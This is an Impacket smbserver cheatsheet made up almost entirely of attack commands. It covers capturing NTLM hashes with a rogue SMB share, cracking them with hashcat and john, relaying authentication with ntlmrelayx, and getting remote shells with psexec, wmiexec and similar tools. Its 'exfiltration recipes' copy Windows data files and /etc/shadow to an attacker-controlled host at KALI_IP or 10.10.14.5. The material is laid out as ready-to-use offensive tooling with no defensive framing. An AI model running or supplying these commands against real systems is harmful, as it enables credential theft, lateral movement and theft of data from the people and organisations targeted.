# Impacket SMBServer Cheatsheet — Quick Reference

## Quick Start

```bash
# Basic SMB share
impacket-smbserver loot /tmp/exfil

# With SMBv2 support
impacket-smbserver loot /tmp/exfil -smb2support

# Authenticated share
impacket-smbserver loot /tmp/exfil -smb2support -user admin -password pass123

# Capture NTLM hashes
impacket-smbserver loot /tmp/exfil -smb2support -outputfile /tmp/hashes.txt
```

## Core Commands

| Action | Command |
|--------|---------|
| Basic SMB share | `impacket-smbserver loot /tmp/exfil` |
| With SMBv2 | `impacket-smbserver loot /tmp/exfil -smb2support` |
| Auth required | `impacket-smbserver loot /tmp/exfil -smb2support -user admin -password pass` |
| Capture hashes | `impacket-smbserver loot /tmp/exfil -smb2support -outputfile hashes.txt` |
| Verbose output | `impacket-smbserver loot /tmp/exfil -smb2support -ts -debug` |
| Custom port | `impacket-smbserver loot /tmp/exfil -smb2support -port 8445` |

## NTLM Hash Capture & Cracking

```bash
# Capture hashes
impacket-smbserver loot /tmp/exfil -smb2support -outputfile /tmp/ntlm_hashes.txt

# Crack with hashcat (NTLMv2)
hashcat -m 5600 /tmp/ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/ntlm_hashes.txt

# Crack NTLMv1
hashcat -m 5500 /tmp/ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
```

## NTLM Relay

```bash
# Start relay server
impacket-ntlmrelayx -t 10.10.10.1 -smb2support -socks

# Start SMB server to trigger auth
impacket-smbserver loot /tmp/exfil -smb2support

# Use captured session via socks
impacket-psexec CORP/admin@10.10.10.1 -hashes :HASH
```

## Impacket Toolkit Integration

| Tool | Command | Purpose |
|------|---------|---------|
| secretsdump | `impacket-secretsdump user:pass@target` | Dump credentials |
| wmiexec | `impacket-wmiexec user:pass@target` | Remote shell via WMI |
| psexec | `impacket-psexec user:pass@target` | Remote shell via PsExec |
| smbexec | `impacket-smbexec user:pass@target` | Remote shell via SMB |
| atexec | `impacket-atexec user:pass@target "cmd"` | Execute via Task Scheduler |
| dcomexec | `impacket-dcomexec user:pass@target` | Remote shell via DCOM |
| smbclient | `impacket-smbclient user:pass@target` | SMB client operations |
| netview | `impacket-netview user:pass@target` | Network enumeration |

## Exfiltration Recipes

### Windows to Linux (SMB Pull)

```bash
# Kali side
impacket-smbserver loot /tmp/exfil -smb2support

# Windows side
net use L: \\KALI_IP\loot
copy C:\data\*.xlsx L:\
net use L: /delete
```

### PowerShell Upload

```powershell
# PowerShell: Upload files to SMB share
New-PSDrive -Name L -PSProvider FileSystem -Root "\\10.10.14.5\loot" -Credential $cred
Copy-Item "C:\data\secret.docx" -Destination "L:\"
Remove-PSDrive -Name L
```

### Linux to Linux (SMB Mount)

```bash
# Mount the SMB share
sudo mkdir -p /mnt/loot
sudo mount -t cifs //KALI_IP/loot /mnt/loot -o guest

# Copy files
cp /etc/shadow /mnt/loot/
cp /etc/passwd /mnt/loot/

# Unmount
sudo umount /mnt/loot
```

### Capture and Crack

```bash
# Start server with hash capture
impacket-smbserver loot /tmp/exfil -smb2support -outputfile /tmp/hashes.txt -ts

# Monitor for new hashes
tail -f /tmp/hashes.txt

# Auto-crack (in another terminal)
watch -n 10 'hashcat -m 5600 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt --force 2>/dev/null'
```

## Python API Quick Reference

```python
from impacket.smbserver import SimpleSMBServer

# Basic server
server = SimpleSMBServer(listenAddress='0.0.0.0', listenPort=445)
server.setSMB2Support(True)
server.addShare('loot', '/tmp/exfil', comment='Exfil Share')
server.start()

# With authentication
server.addCredential('admin', 1001,
                     'aad3b435b51404eeaad3b435b51404ee',
                     '8846f7eaee8fb117ad06bdd830b7586c')

# Multiple shares
server.addShare('public', '/tmp/public', comment='Public')
server.addShare('confidential', '/tmp/conf', comment='Confidential')
```

## Useful Combos

| Scenario | Command |
|----------|---------|
| Basic exfil | `impacket-smbserver loot /tmp/exfil -smb2support` |
| Auth + capture | `impacket-smbserver loot /tmp/exfil -smb2support -user admin -password pass -outputfile hashes.txt` |
| Relay attack | `impacket-ntlmrelayx -t TARGET -smb2support -socks` + `impacket-smbserver loot /tmp/exfil -smb2support` |
| Full recon | `impacket-smbserver loot /tmp/exfil -smb2support -ts -debug -outputfile /tmp/all.txt` |
| Payload hosting | `impacket-smbserver payloads /tmp/payloads -smb2support` |

## Troubleshooting

| Problem | Fix |
|---------|-----|
| Port 445 in use | `sudo lsof -i :445 && sudo kill <PID>` |
| SMBv2 fails | Add `-smb2support` flag |
| Permission denied | `chmod 777 /tmp/exfil` |
| Hash not captured | Check Windows NTLM policy, use `-debug` |
| Module not found | `sudo apt reinstall python3-impacket` |
| Slow performance | Use tmpfs (`/tmp`), disable `-debug` |

## NTLM Hash Formats

```
# NTLMv2 Hash Format
username::domain:ServerChallenge:NTProofStr:NTResponse

# Example
admin::WORKGROUP:1122334455667788:AABB...FF:0101000000000000...

# LM:NT Format (for -hashes flag)
LMHash:NTHash

# Example
aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

## Quick Reference Card

```
impacket-smbserver — SMB Server & NTLM Capture
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BASIC:      smbserver SHARE PATH
SMBv2:      -smb2support
AUTH:       -user USER -password PASS
CAPTURE:    -outputfile FILE
DEBUG:      -ts -debug
PORT:       -port 8445
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
RELAY:      ntlmrelayx -t TARGET -smb2support -socks
CRACK:      hashcat -m 5600 hashes.txt wordlist.txt
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```
